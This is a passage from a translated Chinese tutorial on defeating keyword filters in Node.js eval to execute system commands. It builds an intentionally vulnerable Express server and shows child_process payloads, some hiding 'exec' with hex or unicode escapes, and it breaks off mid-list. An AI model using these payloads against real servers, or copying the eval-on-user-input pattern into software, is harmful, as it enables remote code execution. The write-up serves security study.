# nodejs中代码执行绕过的一些技巧
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
在php中，eval代码执行是一个已经被玩烂了的话题，各种奇技淫巧用在php代码执行中来实现bypass。这篇文章主要讲一下`nodejs`中bypass的一些思路。
## 1\. child_process
首先介绍一下nodejs中用来执行系统命令的模块`child_process`。Nodejs通过使用child_process模块来生成多个子进程来处理其他事物。在child_process中有七个方法它们分别为：execFileSync、spawnSync,execSync、fork、exec、execFile、以及spawn,而这些方法使用到的都是spawn()方法。因为`fork`是运行另外一个子进程文件，这里列一下除fork外其他函数的用法。
    require("child_process").exec("sleep 3");
    require("child_process").execSync("sleep 3");
    require("child_process").execFile("/bin/sleep",["3"]); //调用某个可执行文件，在第二个参数传args
    require("child_process").spawn('sleep', ['3']);
    require("child_process").spawnSync('sleep', ['3']);
    require("child_process").execFileSync('sleep', ['3']);
不同的函数其实底层具体就是调用spawn，有兴趣的可以跟进源码看一下
    const child = spawn(file, args, {
      cwd: options.cwd,
      env: options.env,
      gid: options.gid,
      uid: options.uid,
      shell: options.shell,
      windowsHide: !!options.windowsHide,
      windowsVerbatimArguments: !!options.windowsVerbatimArguments
    });
## 2\. nodejs中的命令执行
为了演示代码执行，我写一个最简化的服务端，代码如下
    const express = require('express')
    const bodyParser = require('body-parser')
    const app = express()
    app.use(bodyParser.urlencoded({ extended: true }))
    app.post('/', function (req, res) {
        code = req.body.code;
        console.log(code);
        res.send(eval(code));
    })
    app.listen(3000)
原理很简单，就是接受`post`方式传过来的code参数，然后返回`eval(code)`的结果。
在nodejs中，同样是使用`eval()`函数来执行代码，针对上文提到rce函数，首先就可以得到如下利用代码执行来rce的代码。
> 以下的命令执行都用curl本地端口的方式来执行
    eval('require("child_process").execSync("curl 127.0.0.1:1234")')
这是最简单的代码执行情况，当然一般情况下，开发者在用eval而且层层调用有可能接受用户输入的点，并不会简单的让用户输入直接进入，而是会做一些过滤。譬如，如果过滤了exec关键字，该如何绕过?
> 当然实际不会这么简单，本文只是谈谈思路，具体可以根据实际过滤的关键字变通
下面是微改后的服务端代码，加了个正则检测`exec`关键字
    const express = require('express')
    const bodyParser = require('body-parser')
    const app = express()
    function validcode(input) {
      var re = new RegExp("exec");
      return re.test(input);
    }
    app.use(bodyParser.urlencoded({ extended: true }))
    app.post('/', function (req, res) {
      code = req.body.code;
      console.log(code);
      if (validcode(code)) {
        res.send("forbidden!")
      } else {
        res.send(eval(code));
      }
    })
    app.listen(3000)
这就有6种思路:
  * 16进制编码
  * unicode编码
  * 加号拼接
  * 模板字符串
  * concat函数连接
  * base64编码
###  2.1 16进制编码
第一种思路是16进制编码，原因是在`nodejs`中，如果在字符串内用16进制，和这个16进制对应的ascii码的字符是等价的(第一反应有点像mysql)。
    console.log("a"==="\x61");
    // true
但是在上面正则匹配的时候，16进制却不会转化成字符，所以就可以绕过正则的校验。所以可以传
    require("child_process")["exe\x63Sync"]("curl 127.0.0.1:1234")
###  2.2 unicode编码
思路跟上面是类似的，由于`JavaScript`允许直接用码点表示Unicode字符，写法是”反斜杠+u+码点”，所以我们也可以用一个字符的unicode形式来代替对应字符。
    console.log("\u0061"==="a");
    // true
    require("child_process")["exe\u0063Sync"]("curl 127.0.0.1:1234")
###  2.3 加号拼接
原理很简单，加号在js中可以用来连接字符，所以可以这样